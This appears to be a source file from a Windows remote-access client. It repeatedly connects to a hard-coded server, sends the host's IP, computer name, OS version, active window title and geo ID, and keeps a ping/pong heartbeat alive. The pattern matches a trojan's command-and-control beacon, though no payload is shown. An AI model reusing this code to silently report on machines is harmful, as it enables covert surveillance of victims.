//
// Created by LUNAFE on 2022-02-09.
//

#include "handling.h"

bool handling::Connected() {
#ifdef DEBUG
    printf("[DEBUG] TRY_CONNECT\n");
#endif
    WSADATA wsa_data;
    WSAStartup(MAKEWORD(2, 2), &wsa_data);

    main::sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (main::sock == -1) {
#ifdef DEBUG
        wprintf(L"[DEBUG] SOCKET_ERROR\n");
#endif
        return 0;
    }

    SOCKADDR_IN in = {};
    in.sin_family = AF_INET;
    in.sin_port = htons(PORT);
    in.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(main::sock, (SOCKADDR *) &in, sizeof(in)) == SOCKET_ERROR) {
#ifdef DEBUG
        printf("[DEBUG] SOCKET_ERROR\n");
#endif
        return false;
    } else {
#ifdef DEBUG
        printf("[DEBUG] SOCKET_GOOD\n");
#endif
        return true;
    }
}


void handling::Handler() {
    WaitConnected();
#ifdef DEBUG
    printf("[DEBUG] Connected!\n");
#endif
    packet info_packet;
    util::MakeInfo(&info_packet);
#ifdef DEBUG
    struct INFO *test = (struct INFO *) info_packet.get_data();
    wprintf(L"[DEBUG] ip: %S\n[DEBUG] name: %S\n[DEBUG] os: %S\n[DEBUG] window_title: %S\n[DEBUG] geo_id: %S\n", test->ip_address, test->computer_name, test->os_version, test->window_title, test->geo_id);
#endif
    info_packet.Send();

    while (true) {
        packet recevie_packet;
        int result = recevie_packet.Receive();
        if (result == -1) {
            WaitConnected();
            packet info_packet;
            util::MakeInfo(&info_packet);
            info_packet.Send();
        } else if (result == 1) {
            packet pong_packet;
            util::MakePong(&pong_packet);
            if (pong_packet.Send() == -1) {
                WaitConnected();
                packet info_packet;
                util::MakeInfo(&info_packet);
                info_packet.Send();
            } else {
#ifdef DEBUG
                printf("[DEBUG] PONG_SENT\n");
#endif
            }
        } else if (result == 0) {
        }
        Sleep(1000);
    }
}

void handling::WaitConnected() {
    while (!handling::Connected()) {
#ifdef DEBUG
        printf("[DEBUG] Connecting...\n");
#endif
        Sleep(5000);
    }
}